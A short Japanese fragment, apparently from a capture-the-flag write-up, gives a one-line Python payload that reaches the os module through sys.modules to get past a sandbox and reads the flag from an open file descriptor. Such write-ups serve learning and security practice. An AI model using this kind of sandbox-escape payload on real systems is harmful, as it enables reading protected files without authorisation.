ペイロードは以下。`os`モジュールを復活させ、FLAGのデータを読み取る。

```
print(sys.modules['os'].read(3, 100).decode())
```